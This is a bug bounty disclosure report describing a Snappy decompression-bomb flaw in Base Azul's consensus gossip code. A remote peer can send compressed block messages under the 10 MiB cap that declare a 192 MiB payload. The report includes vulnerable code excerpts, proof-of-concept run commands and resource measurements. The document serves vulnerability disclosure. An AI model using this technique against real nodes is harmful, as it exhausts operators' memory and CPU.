# 75246 bc critical remote snappy compressed p2p block gossip message can force excessive memory and cpu usage in base azul nodes

**Submitted on Apr 28th 2026 at 01:27:01 UTC by @z41zen for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75246
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

### Brief/Intro

Base Azul consensus gossip accepts Snappy-compressed block messages from remote libp2p/gossipsub peers. The node decompresses attacker-controlled gossip message bytes before enforcing a decompressed-size bound or validating the payload signature. A remote peer can send a message below the configured 10 MiB gossip transport cap that expands to tens or hundreds of MiB on the victim, causing significant CPU and memory consumption before the malformed payload is rejected.

### Vulnerability Details

The issue is in the Base-native consensus gossip path under `base/base`, not in the smart contract assets.

The configured gossip cap is intended to limit both gossip RPC containers and decompressed individual messages:

`crates/consensus/gossip/src/config.rs`

```rust
pub const MAX_GOSSIP_SIZE: usize = 10 * (1 << 20);
```

However, compute\_message\_id decompresses the untrusted message before any decompressed-size check:

```rust
fn compute_message_id(msg: &Message) -> MessageId {
let mut decoder = Decoder::new();
let id = decoder.decompress_vec(&msg.data).map_or_else(
```

The block handler then routes remote block gossip messages into versioned payload decoding before signature or block validity checks:\
`crates/consensus/gossip/src/handler.rs`

```rust
fn handle(&mut self, msg: Message) -> (MessageAcceptance, Option<NetworkPayloadEnvelope>) {
let decoded = if msg.topic == self.blocks_v1_topic.hash() {
    NetworkPayloadEnvelope::decode_v1(&msg.data)
...
} else if msg.topic == self.blocks_v4_topic.hash() {
    NetworkPayloadEnvelope::decode_v4(&msg.data)
```

The versioned decoders allocate the full Snappy-decompressed buffer using decompress\_vec before rejecting malformed data:\
`crates/common/rpc-types-engine/src/envelope.rs`

```rust
pub fn decode_v4(data: &[u8]) -> Result<Self, PayloadEnvelopeError> {
use ssz::Decode;
let mut decoder = snap::raw::Decoder::new();
let decompressed = decoder.decompress_vec(data)?;
```

Because Snappy encodes the decompressed length in the stream, a small compressed message can force a much larger allocation. The PoC sends valid Snappy data under the 10 MiB gossip transmit cap that declares a 192 MiB decompressed payload. The victim performs allocation/decompression and only then rejects the payload.

The attack requires only a remote libp2p/gossipsub peer connection to the node's public P2P port. It does not require sequencer privileges, batcher signer access, TEE/ZK keys, L1 validator behavior, RPC access, or Base-operated infrastructure.

### Impact Details

The selected impact is increased network processing node resource consumption.

In a host-to-RunPod live demo using only one P2P connection, the victim process baseline was stable at 16,992 KB RSS before the attack. During the attack phase, the same process averaged 242,966 KB RSS and peaked at 431,080 KB RSS.

```
baseline count=37 avg_rss_kb=16992 max_rss_kb=16992 avg_cpu_pct=0.00 max_cpu_pct=0.00
attack   count=83 avg_rss_kb=242966 max_rss_kb=431080 avg_cpu_pct=56.49 max_cpu_pct=102.00
```

This is a 1329.9% average RSS increase and a 2437.0% peak RSS increase relative to the immediate pre-attack baseline. CPU averaged 56.49% and peaked at 102.00%, where 100% means one fully used CPU core.

The victim rejected the payload only after processing it:

```
VICTIM_MESSAGE compressed_bytes=9443332 declared_decompressed_bytes=201326592 poll_ms=7280
handle_ms=45908 rss_before_poll_kb=17376 rss_after_poll_kb=46896 rss_before_handle_kb=46896
rss_after_handle_kb=28644 status=Reject payload_present=false
```

This report does not claim total network shutdown or a permanent chain split. The demonstrated impact is remote node-level resource exhaustion through the consensus gossip path.

### References

Affected code paths:

* `crates/consensus/gossip/src/config.rs`
* `crates/consensus/gossip/src/handler.rs`
* `crates/common/rpc-types-engine/src/envelope.rs`
* `crates/client/cli/src/p2p.rs`

## Link to Proof of Concept

<https://gist.github.com/s-zaizen/d52addbaeed120d4802588161ad2ee1d>

## Proof of Concept

{% stepper %}
{% step %}

### 1. Build the PoC

Copy `gossip_peer_demo.rs` from the secret Gist into: `crates/consensus/gossip/examples/gossip_peer_demo.rs`

Then build:

```bash
cargo +1.93.1 build -p base-consensus-gossip --example gossip_peer_demo
```

{% endstep %}

{% step %}

### 2. Start the victim

On the victim machine:

```bash
target/debug/examples/gossip_peer_demo victim /ip4/0.0.0.0/tcp/9222 84532
```

Example victim output:

```
VICTIM_PEER_ID=16Uiu2HAmGZLPKBaPAB68ELTh4nkkG9TFTAPfqk6TpwkAd7KVn1AY
VICTIM_TOPIC=/optimism/84532/3/blocks
VICTIM_READY
```

{% endstep %}

{% step %}

### 3. Start resource monitoring

The Gist includes `monitor_victim.sh`, which samples RSS and CPU from `/proc`.

```bash
echo baseline > /tmp/resource_phase
/tmp/monitor_victim.sh <victim_pid> /tmp/resource_phase /tmp/resource_samples.csv 120 1
```

After collecting baseline samples, switch phase:

```bash
echo attack > /tmp/resource_phase
```

{% endstep %}

{% step %}

### 4. Run the attacker

From the host machine:

```bash
cargo +1.93.1 run \
--manifest-path /path/to/base/crates/consensus/gossip/Cargo.toml \
-p base-consensus-gossip \
--example gossip_peer_demo \
-- attacker /ip4/<victim-ip>/tcp/<victim-port>/p2p/<victim-peer-id> 201326592 84532
```

The `201326592` argument is the declared decompressed payload length, 192 MiB. The resulting compressed message is still below the 10 MiB gossip cap.

Observed attacker output:

```
ATTACKER_CONNECTED peers=1 topic=/optimism/84532/3/blocks
ATTACKER_PUBLISHED compressed_bytes=9443332 declared_decompressed_bytes=201326592 elapsed_ms=314
```

{% endstep %}

{% step %}

### 5. Observe victim impact

Observed victim output:

```
VICTIM_MESSAGE compressed_bytes=9443332 declared_decompressed_bytes=201326592 poll_ms=7280
handle_ms=45908 rss_before_poll_kb=17376 rss_after_poll_kb=46896 rss_before_handle_kb=46896
rss_after_handle_kb=28644 status=Reject payload_present=false
```

Observed `/proc` resource summary:

```
baseline count=37 avg_rss_kb=16992 max_rss_kb=16992 avg_cpu_pct=0.00 max_cpu_pct=0.00
attack   count=83 avg_rss_kb=242966 max_rss_kb=431080 avg_cpu_pct=56.49 max_cpu_pct=102.00
```

This demonstrates that a single remote P2P peer can cause more than a 30% increase in victim node resource consumption before the invalid gossip payload is rejected.
{% endstep %}
{% endstepper %}
